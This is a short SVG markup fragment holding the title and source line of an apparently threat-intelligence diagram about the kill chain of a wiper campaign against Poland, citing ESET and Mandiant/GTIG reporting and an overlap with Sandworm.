  <text x="40" y="40" class="header">Campaign C0063 Poland Wiper — kill chain</text>
  <text x="40" y="60" class="subhead">ESET WeLiveSecurity + Mandiant / GTIG . 1 May 2026 . 29 Dec 2025 . Sandworm overlap</text>

